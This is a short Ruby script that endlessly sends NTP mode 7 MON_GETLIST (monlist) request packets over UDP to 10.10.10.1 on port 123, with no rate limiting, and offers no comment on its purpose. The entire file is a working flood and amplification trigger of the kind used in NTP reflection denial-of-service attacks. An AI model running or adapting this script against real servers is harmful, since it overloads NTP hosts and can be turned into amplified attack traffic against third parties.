#!/usr/bin/ruby
require 'socket'

def sendPackets()
        mysock = UDPSocket.new
        dat = [0x17, 0x00, 0x03, 0x2a, 0x00, 0x00]


        186.times do
                dat.push(0x00)
        end

        while true
                mysock.send(dat.pack('C*'), 0, '10.10.10.1', 123)
                #sleep(1.0/50.0)
        end
        mysock.close
end

#sendPackets()

threadArray = Array.new
threads = 0

$counter = 0

1.times do
        threadArray.push(Thread.new{sendPackets()})
end

threadArray.each { |t|
                #puts "joining #{t} at #{Time.now}"
                t.join
                threads += 1
}
puts "hi"

